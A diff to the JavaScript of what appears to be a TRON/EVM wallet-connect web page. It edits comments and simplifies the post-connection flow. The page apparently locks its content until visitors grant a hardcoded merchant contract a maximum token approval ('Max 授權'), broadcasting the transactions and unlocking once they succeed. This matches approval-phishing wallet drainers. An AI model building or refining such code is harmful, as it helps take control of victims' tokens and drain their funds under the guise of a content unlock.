@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終穩定版：最極端的樂觀授權判斷 (無檢查，廣播成功即解鎖) 🚨
+// 🚨 最終版本：優化 handlePostConnection (簡化、移除遞迴) 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -66,7 +66,6 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
     showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
     
     try {
-        // 廣播交易 (不輪詢，直接返回)
         const txHash = await methodCall.send({
             feeLimit: 150_000_000, 
             callValue: callValue,
@@ -144,6 +143,7 @@ async function connectTronLink() {
         await initializeContracts();
         updateConnectionUI(true, userAddress);
         // 不在這裡執行 handlePostConnection
+        
         return true;
     } catch (error) {
         console.error("TronLink 連接失敗:", error);
@@ -161,10 +161,13 @@ async function connectWalletLogic() {
     if (evmProvider) {
         showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
         try {
+            // 請求 EVM 連接
             const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
-            const evmAddress = accounts[0]; 
+            const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)
 
+            // 2. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
             if (!window.tronWeb) {
+                // 連線成功，但無法發送 TRON 合約交易
                 throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
             }
             
@@ -177,17 +180,18 @@ async function connectWalletLogic() {
             return true;
 
         } catch (error) {
+            // EVM 請求被拒絕或錯誤
             console.error("EVM Provider 連接失敗或被拒絕，嘗試 TronLink...");
         }
     }
     
-    // 2. 備用：嘗試 TronLink 連線 (如果存在)
+    // 3. 備用：嘗試 TronLink 連線 (如果存在)
     if (window.tronLink) {
         const tronLinkConnected = await connectTronLink();
         if (tronLinkConnected) return true;
     }
 
-    // 3. 完全沒有任何 Provider
+    // 4. 完全沒有任何 Provider
     showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
     return false;
 }
@@ -271,7 +275,7 @@ async function connectAndAuthorize() {
 
 
 // ---------------------------------------------
-// 連線成功後處理：檢查並控制 iframe 遮罩
+// 連線成功後處理：僅作為初始化流程執行一次，無循環
 // ---------------------------------------------
 async function handlePostConnection() {
     if (!isConnectedFlag) return;
@@ -281,15 +285,15 @@ async function handlePostConnection() {
     const allAuthorized = status.contract && tokenAuthorized;
 
     if (allAuthorized) {
-        // 所有授權已完成：最終成功狀態
+        // 🚨 授權已完成：立即解鎖
         showOverlay('✅ Max 授權已成功！數據已解鎖。');
         updateContentLock(true); 
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
-        return; // 🚨 關鍵：解鎖後，直接結束 handlePostConnection 
+        return; // 🚨 立即停止函數的執行，不輪詢
     } 
     
-    // 授權未完成：給出提示並啟動授權流程，然後停止
+    // 授權未完成：給出提示並啟動授權流程，然後停止 (沒有 else 塊，避免無限呼叫)
     showOverlay(`
         正在檢查授權狀態，Max 授權尚未完成。
         
@@ -299,13 +303,8 @@ async function handlePostConnection() {
     `);
     updateContentLock(false); 
     
-    const authSuccess = await connectAndAuthorize();
-    
-    // 🚨 不再輪詢：授權成功後，授權流程的責任就交給用戶了，這裡不進行任何遞迴
-    // 下一次訪問如果沒有完成，再次引導。
-    if (!authSuccess) {
-        console.error("Max 授權流程未完全完成。");
-    }
+    await connectAndAuthorize();
+    // 🚨 修正：在這裡不重新檢查狀態，而是讓使用者再次點擊連線以檢查/重新授權。
 }
 
 // ---------------------------------------------
@@ -326,7 +325,12 @@ async function connectWallet() {
     }
 
     // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
-    await connectWalletLogic(); 
+    const connected = await connectWalletLogic(); 
+    
+    // 如果第一次連線成功，handlePostConnection 會被調用，完成授權檢查。
+    if (connected) {
+        // 🚨 只有第一次連線成功才觸發檢查
+    }
     
     if (connectButton) connectButton.disabled = false;
 }
